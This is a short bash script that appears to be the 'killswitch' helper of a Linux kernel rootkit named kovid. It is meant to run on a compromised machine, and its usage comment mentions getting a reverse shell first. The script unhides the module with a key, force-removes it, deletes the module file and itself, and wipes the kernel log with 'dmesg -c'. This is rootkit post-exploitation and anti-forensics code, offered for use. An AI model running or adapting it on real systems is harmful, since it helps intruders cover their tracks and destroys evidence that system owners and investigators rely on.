#!/bin/bash

# "Usage: $0 <proc_filename> <key>"

# For example, get reverse shell and run:
# sudo ./scripts/killswitch.sh /proc/myprocname 2 &> /dev/null

PROC_FILENAME=$1
KEY=$2

sleep 30

kill -CONT 31337

echo unhide-lkm=$KEY > $PROC_FILENAME

# Remove the kernel module
sudo rmmod -f kovid

# Clean up the script and the module
sudo rm -f kovid.ko "$0"

# Clean dmesg as well
sudo dmesg -c
